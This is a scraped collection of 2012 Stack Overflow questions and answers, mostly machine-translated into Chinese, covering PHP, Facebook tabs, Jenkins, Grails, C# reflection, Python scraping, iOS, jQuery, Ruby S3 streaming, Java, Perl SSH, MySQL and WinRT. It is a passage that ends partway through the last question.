# php - Singleton Design Pattern for MySQLi Connection inside static functions

> ID：10078600
> 
> 赞同：0
> 
> 时间：2012-04-09T19:26:39.400
> 
> 标签：php, oop, static, singleton, mysqli

I'm new to using MySQLi. I've used PHP's `mysql_*` functions forever and am far too comfortable with them, but I write object oriented code and thought it's time to start using a more powerful and flexible database approach.

I've set up a class `DB` which has a static method (`DB::get()`) for returning (or building and returning) my connection, which is a static variable within the class.

What I want to know is how to use this in my other classes. I see a lot of people creating a local class variable (`$this->db` or otherwise) in each class that will use the connection, which is initialised in the `__construct()` function. I'm perfectly happy with that, but what about static methods?

Because there's no object, the `__construct()` function hasn't been called. Is it simply a case of calling:

`$db = DB::get();`

In each static method? This seems a little clunky, especially considering the `mysql_*` functions don't require any of this.

# facebook - 如果用户喜欢页面，Facebook 会显示标签，它会进入注册表单，如果已注册，则会显示另一个页面

> ID：10078603
> 
> 赞同：0
> 
> 时间：2012-04-09T19:26:43.743
> 
> 标签：facebook, tabs, facebook-like

我正在寻找一个显示标签。当用户转到粉丝页面选项卡时，它将显示一个特定的选项卡。当用户喜欢该页面时，它将显示一个注册表单。如果用户也已注册，它将显示另一个选项卡（基本上是在它被喜欢和注册之后）。如果用户在我的页面上注册并且还喜欢，有没有办法访问？这甚至可能吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T22:28:25.300

是的可能。谷歌“Facebook Fan Gate”，你会发现很多代码示例来说明如何做到这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T09:15:06.690

试试这个

```
$facebook = new Facebook(array(
'appId'  => 'APP_ID',
'secret' => 'APP_SECRET',
'cookie' => true,
));

$session = $facebook->getSession();

$me = null;

if ($session) {
try {
$uid = $facebook->getUser();
$me = $facebook->api('/me');
} catch (FacebookApiException $e) {
error_log($e);
}
}

$signed_request = $_REQUEST["signed_request"];

function parse_signed_request($signed_request, $secret) {
list($encoded_sig, $payload) = explode('.', $signed_request, 2);

// decode the data
$sig = base64_url_decode($encoded_sig);
$data = json_decode(base64_url_decode($payload), true);

if (strtoupper($data['algorithm']) !== 'HMAC-SHA256') {
error_log('Unknown algorithm. Expected HMAC-SHA256');
return null;
}

// check sig
$expected_sig = hash_hmac('sha256', $payload, $secret, $raw = true);
if ($sig !== $expected_sig) {
error_log('Bad Signed JSON signature!');
return null;
}

return $data;
} 

function base64_url_decode($input) {
return base64_decode(strtr($input, '-_', '+/'));
}

$data = parse_signed_request($_REQUEST["signed_request"], "APP_SECRET");

if ($data['page']['liked']){

//SHOW REGISTRATION FORM

}else{

//SHOW NO FAN PAGE

} 
```

# jenkins - 在 Jenkins 中，匿名用户需要哪些权限才能通过网络挂钩开始工作？

> ID：10078605
> 
> 赞同：2
> 
> 时间：2012-04-09T19:26:57.043
> 
> 标签：jenkins, kiln

我们有一个 Jenkins 安装，它使用 OpenID 插件来验证我们公司的用户。我们遇到的问题是我们的源代码控制（Kiln/Mercurial）以匿名方式或通过用户名/密码向 Jenkins 推送通知。由于所有用户都使用 OpenID，我无法使用用户名/密码。话虽如此，匿名用户能够在 Jenkins 中启动工作构建的最低权限是多少？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T20:47:04.830

如果您使用基于矩阵的安全性（或基于项目的矩阵），用户需要勾选“作业”组中的“构建”列。

# grails - 新 Grails 安装速度慢

> ID：10078607
> 
> 赞同：2
> 
> 时间：2012-04-09T19:27:11.733
> 
> 标签：grails

我刚刚开始学习 Grails 和 Groovy。今天重新安装了 Grails 1.3.8 并且它爬行 - 我的环境中一定有一些东西导致了问题。我运行了 create-app（按照教程），然后运行了 app。两者都花了很长时间，但是嘿，第一次通过。再次运行 run-app，花了将近 5 分钟，显然是在编译阶段。Windows 7 机器，4 GB 内存，Intel i5 CPU。不知道从哪里开始寻找，但知道这是不正常的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T00:21:58.763

我想知道它是怎么发生在你身上的。我有 2gb 内存，我在 pc 上运行 Ubuntu，它非常快。首先检查您的内存限制。

[对于你的问题，你可以在这里](http://grails.1312388.n4.nabble.com/Grails-development-is-really-slow-tc4257651.html)找到一个很好的讨论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:53:03.243

当我遇到这种情况时，我通常没有堆或 permGen 空间。启动 visualvm 并检查这两个内存限制。如果您的内存限制太小，它会在崩溃之前大大减慢

# javascript - facebook 如何导航到照片（更改 window.location）但过去的内容仍然存在？

> ID：10078609
> 
> 赞同：1
> 
> 时间：2012-04-09T19:27:18.823
> 
> 标签：javascript, jquery, ajax, facebook

我刚刚注意到，当我在我的 facebook 新闻提要上单击一张照片时，窗口位置发生了变化，照片出现了，但上一页的内容仍然在照片的后面。您可以看到它，因为照片查看器的背景是透明的。

如何做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:04:48.710

出色地。URL 更改为：/photo.php?fbid=10150643780577073&set=a.446526812072.240769.709452072&type=1&theater

查询字符串中有足够的信息可以知道用户来自哪个页面。此信息用于在前景中显示照片并在背景中包含原始页面。所以这两个页面都使用了一些如果 facebooks 后端代码来生成 html 前端，并且在 photo.php 页面的情况下包括一些额外的东西：前景图片加上必要的 css 和脚本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T20:09:03.403

将来它将使用 HTML5 的历史 API。但是为了跨浏览器兼容性和向后兼容性，请使用[history.js](https://github.com/balupton/history.js)库。

在 HTML5 之前，在不导致页面刷新的情况下设置位置的方法是将 # 锚位置附加到 url，就好像您已移动到锚位置（传统上用于移动并链接到页面上的特定段落），例如`url/to/page#someposition`。

这概括为在锚中表示页面状态；例如，gmail 中的特定消息具有 URL`https://mail.google.com/mail/?shva=1#inbox/2h42c4ahe7fge7`等。

如果你使用 history.js，你应该能够在它们得到广泛支持时轻松升级到 pushState 等。

# 3dsmax - 生成法线贴图的问题

> ID：10078610
> 
> 赞同：0
> 
> 时间：2012-04-09T19:27:24.217
> 
> 标签：3dsmax, autodesk

我正在尝试从使用 3DS max 的模型创建法线贴图。当我转到“渲染到纹理”并按下渲染时，我得到一个红色的图像。在投影映射中，当我单击 pick 时，我找不到任何要选择的东西。谁能帮我创建一个法线贴图或告诉我如何解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-23T22:32:13.180

渲染中的红色是因为高多边形模型与您的投影笼相交，当您按下选择按钮时没有任何东西可供选择的原因是您没有选择低多边形模型，或者因为您没有模型图标（这是一个小的灰色球体）已选中，它从列表中过滤网格。

# c# - 如何获得字典 在 C# 中调用的参数以前的方法？

> ID：10078611
> 
> 赞同：5
> 
> 时间：2012-04-09T19:27:24.970
> 
> 标签：c#, .net, reflection

我希望能够以`IDictionary<string, object>`先前调用的方法的形式获取参数列表。有一个问题：即使是免费的，我也无法使用第三方面向方面的编程框架。

例如：

```
using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Question {
    internal class Program {
        public static void Main(string[] args) {
            var impl = new Implementation();
            impl.MethodA(1, "two", new OtherClass { Name = "John", Age = 100 });
        }
    }

    internal class Implementation {
        public void MethodA(int param1, string param2, OtherClass param3) {
            Logger.LogParameters();
        }
    }

    internal class OtherClass {
        public string Name { get; set; }
        public int Age { get; set; }
    }

    internal class Logger {
        public static void LogParameters() {
            var parameters = GetParametersFromPreviousMethodCall();
            foreach (var keyValuePair in parameters)
                Console.WriteLine(keyValuePair.Key + "=" + keyValuePair.Value);
                // keyValuePair.Value may return a object that maybe required to
                // inspect to get a representation as a string.
        }

        private static IDictionary<string, object> GetParametersFromPreviousMethodCall() {
            throw new NotImplementedException("I need help here!");
        }
    }
} 
```

有什么建议或想法吗？如有必要，请随意使用反射。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:30:28.633

我认为如果没有 AOP，你能做的最好的事情就是使用[StackFrame](http://msdn.microsoft.com/en-us/library/system.diagnostics.stackframe.aspx)并获取被调用的方法。

我想这需要太多的开销。如果你传入一个你修改过的变量怎么办？在方法中修改原始值之前，您必须分配额外的空间来存储原始值。这可能很快就会失控

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:39:04.263

你可以[`StackTrace`](http://msdn.microsoft.com/en-us/library/system.diagnostics.stackframe.aspx)用来得到你需要的一切：

```
var trace = new System.Diagnostics.StackTrace();
var frame = trace.GetFrame(1); //previous
var method = frame.GetMethod(); 
```

现在你有一个[MethodBase](http://msdn.microsoft.com/en-us/library/system.reflection.methodbase.aspx)实例。

您可以通过以下方式获取名称：

```
var method = method.Name; 
```

和参数[`MethodBase.GetParameters`](http://msdn.microsoft.com/en-us/library/system.reflection.methodbase.getparameters.aspx)。

例如：

```
var dict = new Dictionary<string, object>();
foreach (var param in method.GetParameters())
{
    dict.Add(param.Name, param.DefaultValue);
} 
```

# python - 网络爬虫将不起作用

> ID：10078612
> 
> 赞同：0
> 
> 时间：2012-04-09T19:27:28.273
> 
> 标签：python, regex, web-scraping

我已经完全按照教程进行了操作，我希望我的刮刀能够刮掉所有指向包含每个警察局信息的特定页面的链接，但它几乎会返回整个网站。

```
from urllib import urlopen
import re

f = urlopen("http://www.emergencyassistanceuk.co.uk/list-of-uk-police-stations.html").read()

b = re.compile('<span class="listlink-police"><a href="(.*)">')
a = re.findall(b, f)

listiterator = []
listiterator[:] = range(0,16)

for i in listiterator:
    print a 
    print "\n"

f.close() 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:36:39.603

使用[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/bs4/doc/)

```
from bs4 import BeautifulSoup
from urllib2 import urlopen

f = urlopen("http://www.emergencyassistanceuk.co.uk/list-of-uk-police-stations.html").read()

bs = BeautifulSoup(f)

for tag in bs.find_all('span', {'class': 'listlink-police'}):
    print tag.a['href'] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:35:53.980

您正在使用正则表达式来解析 HTML。你不应该，因为你最终只会遇到这种类型的问题。首先，`.*`通配符将匹配尽可能多的文本。但是一旦你解决了这个问题，你就会从沮丧之树上摘下另一个果实。请改用适当的 HTML 解析器。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-09T19:32:53.207

上面有超过 1.6k 个与该类的链接。

我认为它工作正常......是什么让你认为它不工作？

* * *

而且您绝对应该使用*Beautiful Soup*，它非常简单且非常有用。

# objective-c - iOS 5.1 及更低版本的 UISplitViewController 中的 UIPopoverController 手势处理

> ID：10078616
> 
> 赞同：2
> 
> 时间：2012-04-09T19:27:32.003
> 
> 标签：objective-c, ios5, uisplitviewcontroller, uipopovercontroller, gestures

我（以及其他许多人）注意到 Apple 将弹出框控制器的外观更改为使用“滑块”窗口，而不是我使用的通常的“弹出框”表格视图。虽然我对新外观没意见，但和其他人一样，我对引入的滑动手势有疑问：

[iOS 5.1 滑动手势被 UISplitViewController 劫持 - 如何避免？](https://stackoverflow.com/questions/9691523/ios-5-1-swipe-gesture-hijacked-by-uisplitviewcontroller-how-to-avoid)

对此的修复似乎是将拆分视图控制器方法“presentWithGesture”设置为“NO”。

```
UISplitViewController *splitViewController = [[UISplitViewController alloc] init];
splitViewController.presentsWithGesture = NO; 
```

如果用户使用的是 iOS 5.1，这非常有用，但是，如果此代码使用 iOS 5.0 或更低版本运行，则会引发异常，因为此方法仅适用于 iOS 5.1：

```
Terminating app due to uncaught exception 'NSInvalidArgumentException', 
reason: '-[UISplitViewController setPresentsWithGesture:]: unrecognized selector 
```

是否可以在不使用此方法的情况下摆脱此手势，使其向后兼容 iOS 5.0 及更低版本？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T23:25:27.767

对于任何类型的向后兼容性，首先检查新属性的 setter 方法是否存在......

```
if ([mySplitViewController respondsToSelector:@selector(setPresentsWithGesture:)]) {
    [mySplitViewController setPresentsWithGesture:NO];
} 
```

请注意，显然您需要在将 UISplitViewController.view 添加到窗口之前执行此操作。我猜到那时会检查属性并添加或不添加手势识别器。如果在添加视图后更改属性，则没有明显的效果。

# jquery - 如何根据所选项目向上或向下滑动ul元素

> ID：10078617
> 
> 赞同：1
> 
> 时间：2012-04-09T19:27:32.787
> 
> 标签：jquery, menu, accordion, selected

我正在构建的应用程序有以下菜单，我很难应用一些 jquery 规则来隐藏菜单的子类别。

我想要做的如下：

当我第一次加载页面时，我希望每个类别的子项（child1、child2 等）向上滑动（关闭）。通过代码，我跟踪所选项目，因此如果我加载不同的页面，则应根据以下规则构建菜单：

如果我将“选定”类应用到 Category1，那么我希望它的子级向下滑动。如果将“选定”类应用于子级，那么我也希望扩展其父级 ul。

案例 1：应用于 Category1 的选定类

```
<ul>     
<li class="selected has-children first-child">Category1</a>                       
 <ul>
  <li class="first-child">Child1</li>
  <li class=" ">Child2</li>
  <li class=" ">Child3</li>
  <li class=" ">Child4</li>
  <li class=" ">Child5></li>
  <li class=" ">Child6</li>
  <li class="last-child">Child6</li>
 </ul>
</li>
<li class="has-children">Category2</a>
 <ul>
  <li class="first-child">Child1</li>
 </ul>
</li>
<li class="has-children last-child">Category3</a>
 <ul>
  <li class="first-child">Child1</li>
  <li class="last-child">Child2</li>
 </ul>
</li>
</ul> 
```

* * *

```
Case 2: selected class applied to child4 (ul should be expanded)

<ul>     
<li class="selected has-children first-child">Category1</a>                       
 <ul>
  <li class="first-child">Child1</li>
  <li class=" ">Child2</li>
  <li class=" ">Child3</li>
  <li class="selected ">Child4</li>
  <li class=" ">Child5></li>
  <li class=" ">Child6</li>
  <li class="last-child">Child6</li>
 </ul>
</li>
<li class="has-children">Category2</a>
 <ul>
  <li class="first-child">Child1</li>
 </ul>
</li>
<li class="has-children last-child">Category3</a>
 <ul>
  <li class="first-child">Child1</li>
  <li class="last-child">Child2</li>
 </ul>
</li>
</ul> 
```

提前谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:03:26.130

您想要与展开/折叠这些菜单进行任何交互吗？或者您只想在页面加载时应用此功能一次？如果是第二个，那么您需要定义类名：

```
li.parent {
   display:none;
}

li.selected {
   display:block;
} 
```

您需要将此类名称应用于所有父元素。任何具有类名的父元素都`selected`将自动显示其子元素。然后，使用这个 jQuery：

```
$(function() {

   $('li.parent li').each(function() {
      var parent = $(this).parent('ul').parent('li');
      if($(this).hasClass('selected') || parent.hasClass('selected')) {
         parent.show();
      }
   });

}); 
```

这将遍历每个 li 子元素并检查它是否具有类名`selected`。如果是，则显示父 li。

# ruby-on-rails - Ruby 中的 Buffered/RingBuffer IO + Amazon S3 非阻塞块读取

> ID：10078622
> 
> 赞同：0
> 
> 时间：2012-04-09T19:28:17.213
> 
> 标签：ruby-on-rails, ruby, amazon-s3, delayed-job, nonblocking

我在 amazon s3 上有巨大的 csv 文件（100MB+），我想分块读取它们并使用 ruby​​ CSV 库处理它们。我很难为 csv 处理创建正确的 IO 对象：

```
buffer = TheRightIOClass.new
bytes_received = 0
RightAws::S3Interface.new(<access_key>, <access_secret>).retrieve_object(bucket, key) do     |chunk|
  bytes_received += buffer.write(chunk)
  if bytes_received >= 1*MEGABYTE
    bytes_received = 0
    csv(buffer).each do |row|
      process_csv_record(row)
    end
  end
end

def csv(io)
  @csv ||= CSV.new(io, headers: true)
end 
```

我不知道这里的正确设置应该是什么以及 TheRightIOClass 是什么。我不想使用 StringIO 将整个文件加载到内存中。ruby 中是否有 bufferedio 或 ringbuffer 来执行此操作？如果有人使用线程（无进程）和管道有一个好的解决方案，我很乐意看到它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:50:17.700

您可以使用 StringIO 并进行一些巧妙的错误处理，以确保在处理之前将整行放在一个块中。此示例中的打包程序类只是在内存中累积已解析的行，直到您将它们刷新到磁盘或数据库。

```
packer = Packer.new
object = AWS::S3.new.buckets[bucket].objects[path]
io = StringIO.new
csv = ::CSV.new(io, headers: true)
object.read do |chunk|
  #Append the most recent chunk and rewind the IO
  io << chunk
  io.rewind
  last_offset = 0
  begin
    while row = csv.shift do
      #Store the parsed row unless we're at the end of a chunk
      unless io.eof?
        last_offset = io.pos
        packer << row.to_hash
      end
    end
  rescue ArgumentError, ::CSV::MalformedCSVError => e
    #Only rescue malformed UTF-8 and CSV errors if we're at the end of chunk
    raise e unless io.eof?
  end
  #Seek to our last offset, create a new StringIO with that partial row & advance the cursor
  io.seek(last_offset)
  io.reopen(io.read)
  io.read
  #Flush our accumulated rows to disk every 1 Meg
  packer.flush if packer.bytes > 1*MEGABYTES 
end
#Read the last row
io.rewind
packer << csv.shift.to_hash
packer 
```

# java - 确保在构造函数抛出异常时初始化最终变量

> ID：10078629
> 
> 赞同：0
> 
> 时间：2012-04-09T19:28:54.000
> 
> 标签：java, exception, constructor, final

我有一个最终的成员数据：

```
public final Foo foo; 
```

在构造函数中，`foo`初始化如下：

```
foo = new Foo(); 
```

现在，不幸的是，Foo 的构造函数可能会抛出异常：

```
try {
    foo = new Foo();
} catch (Exception e) {
    e.printStackTrace();
} 
```

但是现在编译器抱怨 foo 可能没有被初始化，如果 Foo 的构造函数抛出异常，这是真的。但是，如果我放入`foo = null`catch 大括号内，它会抱怨 foo 可能已被初始化。

Foo 是我无法修改的第三方库。

那么，最优雅的处理方式是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T19:31:36.580

```
foo = createFoo();

...

private static Foo createFoo() {
    try {
        return new Foo();
    } catch (Exception e) {
        e.printStackTrace();
        return null;
    }
} 
```

如果内部对象的构造函数失败，我不评论继续构造外部对象是否有意义......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:41:31.117

```
final Foo foo ;
Foo foo_temp = null ;
try {
    foo_temp = new Foo();
} catch (Exception e) {
    e.printStackTrace();
} finally {
    foo = foo_temp ;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:53:08.183

也许我不明白，但我没有得到错误。请注意，ConTest 的构造函数会引发 Foo 引发的异常。这对我来说是最优雅的（回答你的问题。）如果 Foo 未能初始化，是不是很糟糕？

竞赛.java：

```
 public class ConTest {
       public final Foo foo;
       public ConTest() throws Exception {
           foo = new Foo(3);
       }
   } 
```

Foo.java：

```
 public class Foo {
       public Foo(int i) throws Exception {
           if (i < 0) throw new Exception("yah");
       }
   } 
```

一切都编译得很好。

# perl - perl 5.12 和 5.14 上与 Net::SSH::Perl 的区别

> ID：10078631
> 
> 赞同：0
> 
> 时间：2012-04-09T19:29:00.947
> 
> 标签：perl, ssh

我有以下代码（当然我替换了 myremoteserver.com）：

```
use Modern::Perl;
use Net::SSH::Perl;
use Data::Dumper;

my $ssh = Net::SSH::Perl->new('myremoteserver.com', debug => 1, port => 2999);

$ssh->login('root');
print Dumper $ssh->cmd('uptime'); 
```

在无密钥环境中，我在 perl 5.12 和 5.14 上都运行它。

在 perl 5.12 上它似乎工作：

```
$ perl5.12 /tmp/sshtest.pl 
ko.local: Reading configuration data /Users/david/.ssh/config
ko.local: Reading configuration data /etc/ssh_config
ko.local: Connecting to myremoteserver.com, port 2999.
ko.local: Remote protocol version 2.0, remote software version OpenSSH_5.8p1 Debian-1ubuntu3
Math::BigInt: couldn't load specified math lib(s), fallback to Math::BigInt::Calc at /opt/local/lib/perl5/site_perl/5.12.3/Crypt/DH.pm line 6
ko.local: Net::SSH::Perl Version 1.34, protocol version 2.0.
.o.local: No compat match: OpenSSH_5.8p1 Debian-1ubuntu3
ko.local: Connection established.
ko.local: Sent key-exchange init (KEXINIT), wait response.
ko.local: Algorithms, c->s: 3des-cbc hmac-sha1 none
ko.local: Algorithms, s->c: 3des-cbc hmac-sha1 none
ko.local: Entering Diffie-Hellman Group 1 key exchange.
ko.local: Sent DH public key, waiting for reply.
ko.local: Received host key, type 'ssh-dss'.
ko.local: Host 'myremoteserver.com' is known and matches the host key.
ko.local: Computing shared secret key.
ko.local: Verifying server signature.
ko.local: Waiting for NEWKEYS message.
ko.local: Send NEWKEYS.
ko.local: Enabling encryption/MAC/compression.
ko.local: Sending request for user-authentication service.
ko.local: Service accepted: ssh-userauth.
ko.local: Trying empty user-authentication request.
ko.local: Authentication methods that can continue: publickey.
ko.local: Next method to try is publickey.
ko.local: Publickey: testing agent key '/Users/david/.ssh/github_rsa'
ko.local: Authentication methods that can continue: publickey.
ko.local: Next method to try is publickey.
Permission denied at /tmp/sshtest.pl line 9 
```

但是在 perl 5.14 上：

```
$ perl5.14 /tmp/sshtest.pl 
ko.local: Reading configuration data /Users/david/.ssh/config
ko.local: Reading configuration data /etc/ssh_config
ko.local: Connecting to myremoteserver.com, port 2999.
ko.local: Remote protocol version 2.0, remote software version OpenSSH_5.8p1 Debian-1ubuntu3
ko.local: Net::SSH::Perl Version 1.34, protocol version 2.0.
.o.local: No compat match: OpenSSH_5.8p1 Debian-1ubuntu3
ko.local: Connection established.
ko.local: Sent key-exchange init (KEXINIT), wait response.
ko.local: Algorithms, c->s: 3des-cbc hmac-sha1 none
ko.local: Algorithms, s->c: 3des-cbc hmac-sha1 none
ko.local: Entering Diffie-Hellman Group 1 key exchange.
ko.local: Sent DH public key, waiting for reply.
ko.local: Received host key, type 'ssh-dss'.
ko.local: Host 'myremoteserver.com' is known and matches the host key.
ko.local: Computing shared secret key.
ko.local: Verifying server signature.
Key verification failed for server host key at /opt/local/lib/perl5/site_perl/5.14.1/Net/SSH/Perl/SSH2.pm line 92 
```

我看到的唯一区别是 Math::BigInt 在 perl 5.12 上返回警告。

一些调试信息：

```
~ $ perl5.12 -MNet::SSH::Perl -e 'print $Net::SSH::Perl::VERSION, "\n";'
1.34
~ $ perl5.14 -MNet::SSH::Perl -e 'print $Net::SSH::Perl::VERSION, "\n";'
1.34
~ $ perl5.12 -MMath::BigInt -e 'print $Math::BigInt::VERSION, "\n";'
1.997
~ $ perl5.14 -MMath::BigInt -e 'print $Math::BigInt::VERSION, "\n";'
1.997 
```

知道这里的问题是什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:04:50.670

[当LWP::Protocol::https](http://metacpan.org/module/LWP%3a%3aProtocol%3a%3ahttps)从主 LWP 库中拉出时，控制如何执行 https 验证（特别是`PERL_LWP_SSL_VERIFY_HOSTNAMES`环境变量）的配置选项的默认值发生了变化 - 现在主机名检查由默认值，它以前是关闭的。您的 perl 5.14 库有可能采用了这些新更改，而 5.12 正在使用旧版本。

[在"Now you need LWP::Protocol::https"](http://blogs.perl.org/users/brian_d_foy/2011/07/now-you-need-lwpprotocolhttps.html)中还有更多信息。

# mysql - mysql：如何获取 last_updated_by 列的当前用户？

> ID：10078635
> 
> 赞同：1
> 
> 时间：2012-04-09T19:29:15.583
> 
> 标签：mysql

大多数模式的表都有 last_updated_date 和 last_updated_by 列。我知道如何在 Oracle 中填充它，但我现在使用的是 MySQL。有人可以分享如何获取代表当前登录的数据库用户的mysql系统变量，该用户正在对表启动插入/更新？

我已经用谷歌搜索并浏览了 MySQL 文档，但没有取得多大成功......

谢谢你！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:32:11.957

执行此操作以获取当前用户

```
select user() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:32:32.243

运行这个：

```
select current_user ()

or

select user() 
```

[MySQL](http://dev.mysql.com/doc/refman/5.5/en/information-functions.html)文档。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T19:32:55.827

```
SELECT USER(); 
```

所以例如...

```
update mytable set last_updated=USER() where id=1024; 
```

# java - 使用 collections.reverseOrder() 反转自然顺序

> ID：10078637
> 
> 赞同：4
> 
> 时间：2012-04-09T19:29:30.460
> 
> 标签：java

我有一个类使用优先级队列按升序显示 5 个字符串。我知道要按降序排列，我可以使用“collections.reverseOrder()”方法。如何将此方法与以下代码一起使用？

```
import java.util.*;
public class queue {

    public static void main (String[] args) {

        PriorityQueue<String> sQ = new PriorityQueue<String>();

        sQ.add("theodore");
        sQ.add("theo");
        sQ.add("Shailee");
        sQ.add("Deborah");
        sQ.add("Fernando");
        sQ.add("th");

        while (sQ.size() > 0)
            System.out.println(sQ.remove());

        Collections.reverseOrder(); //I am stuck here...
    }
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-09T19:36:31.737

在删除元素*之前*尝试这样的事情`sQ`：

```
PriorityQueue<String> reversed =
    new PriorityQueue<String>(sQ.size(), new Comparator<String>() {
    @Override
    public int compare(String o1, String o2) {
        return -o1.compareTo(o2);
    }
});
reversed.addAll(sQ); // now `reversed` contains the reversed priority queue 
```

因为您使用的是 的自然排序，所以构建另一个作为参数传递的新比较器是`String`有意义的，该比较器比较字符串但颠倒顺序（注意比较前面的符号）。`PriorityQueue``-`

**编辑：**

正如评论中所指出的，这是一个更简单的解决方案：

```
PriorityQueue<String> reversed =
    new PriorityQueue<String>(sQ.size(), Collections.reverseOrder());
reversed.addAll(sQ); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:32:43.577

首先，您要从队列中删除元素：不要忘记将它们添加回来。如果您查看：[http](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collections.html#reverseOrder) ://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collections.html#reverseOrder () 您会注意到如何使用它:)

祝你好运！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T15:26:01.500

你也可以试试这个：

```
 String[] strArray = new String[0];

    /*Creating array from Queue*/
    strArray = sQ.toArray(strArray);

    Arrays.sort(strArray,Collections.reverseOrder());   

    System.out.println("\n Elements of Queue in REVERSE:\n");

    for(String s:strArray)
    System.out.print(s+" ,"); 
```

但问题是它也会以相反的顺序对您的列表进行**排序**

# objective-c - iOS Facebook Open Graph API 如何设置“引用”属性类型

> ID：10078640
> 
> 赞同：2
> 
> 时间：2012-04-09T19:29:58.460
> 
> 标签：objective-c, ios, facebook

我正在尝试发布操作

```
 NSMutableDictionary *params = [[NSMutableDictionary alloc] initWithCapacity:5];
    [params setObject:[self getHomePageTitle] forKey:@"article"];
    [params setObject:[self getHomePageTitle] forKey:@"title"];
    [params setObject:@"xxxxxxxxxxx" forKey:@"app_id"];        
    [params setObject:self.regularUrlForFacebookSharing forKey:@"url"];
    [params setValue:appDelegate.facebook.accessToken forKey:@"access_token"];

    [appDelegate.facebook requestWithGraphPath:@"me/news.reads" 
                         andParams:params
                     andHttpMethod:@"POST"
                       andDelegate:appDelegate.facebook]; 
```

我为“文章”设置的所有内容都在错误之后不断出现错误

> {"error":{"message":"(#3503) \"\u003Ctitle xmlns=\"http://www.w3.org/1999/xhtml\">xxxxx 是属性 \"article\ 的无效值" 类型为 \"Reference\"","type":"OAuthException","code":3503}}

请建议我应该如何设置“参考”属性类型

# jquery - 使用 on() 移除悬停

> ID：10078641
> 
> 赞同：0
> 
> 时间：2012-04-09T19:30:08.297
> 
> 标签：jquery

我想要一个悬停和删除悬停事件。具有此事件的节点是动态添加的，因此我希望使用 on()。添加悬停事件时，效果很好（下面的#second 列表）。出于某种原因，当我添加关闭悬停事件时，甚至添加悬停事件都不起作用（下面的#first 列表）。

请提供任何线索。一个活生生的例子位于[http://jsfiddle.net/NV7hR/](http://jsfiddle.net/NV7hR/)

谢谢

```
$(document).ready(function() {
  $("#first").on("hover", "a", function(event) {
    $(this).parent().css("background-color", "yellow");
  }, function(event) {
    $(this).parent().css("background-color", "");
  });
  $("#second").on("hover", "a", function(event) {
    $(this).parent().css("background-color", "yellow");
  });
});

<body>
<ul id="first">
    <li><a href="#"/>Link</a></li>
    <li><a href="#"/>Link</a></li>
    <li><a href="#"/>Link</a></li>
</ul>
<ul id="second">
    <li><a href="#"/>Link</a></li>
    <li><a href="#"/>Link</a></li>
    <li><a href="#"/>Link</a></li>
</ul>
</body> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:38:03.317

将悬停拆分为 mouseenter 和 mouseleave，这就是悬停的简写。

```
$("#first").on("mouseenter", "a", function(event) {
   $(this).parent().css("background-color", "yellow");
}).on("mouseleave", "a", function(event) {
   $(this).parent().css("background-color", "");
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:41:09.400

`.hover`因此，这不是一个事件。`hover`是`mouseenter`和`mouseleave`事件的简写。尝试使用如下，

[**演示**](http://jsfiddle.net/skram/NV7hR/2/)

```
$("#first").on({
    mouseenter: function() {
        $(this).parent().css("background-color", "yellow");
    },
    mouseleave: function() {
        $(this).parent().css("background-color", "");
    }
}, 'a'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T19:47:49.390

尽管其他人都声称，您确实可以使用`'hover'`with `.on()`。

只是你不能通过 2 个函数。您需要测试事件类型。

```
$("#first").on("hover", "a", function(e) {
    $(this).css("background-color", e.type === 'mouseenter' ? "yellow" : '');
}); 
```

***演示：http:*** [//jsfiddle.net/HxuuS/](http://jsfiddle.net/HxuuS/)

* * *

仅供参考，传递 2 个函数导致它根本不起作用的原因是第一个处理程序被解释为 的可选`data`参数`on`，因此只有第二个处理程序*（那个`mouseleave`）*被绑定。

# c# - 如何在 WinRT/Windows 8 中按日期顺序获取文件列表

> ID：10078642
> 
> 赞同：4
> 
> 时间：2012-04-09T19:30:13.520
> 
> 标签：c#, windows-8, windows-runtime

我正在尝试在 C# 的 Metro App 中按日期顺序获取文件列表

我认为这段代码应该这样做，

```
var queryOptions = new QueryOptions(CommonFileQuery.OrderByDate, new[] { ".xml" });
queryOptions.FolderDepth = FolderDepth.Deep;
StorageFolder folder = await ApplicationData.Current.LocalFolder.CreateFolderAsync("Recent", CreationCollisionOption.OpenIfExists);

StorageFileQueryResult query = folder.CreateFileQueryWithOptions(queryOptions);

var files = await query.GetFilesAsync(); 
```

但这给了我以下错误：

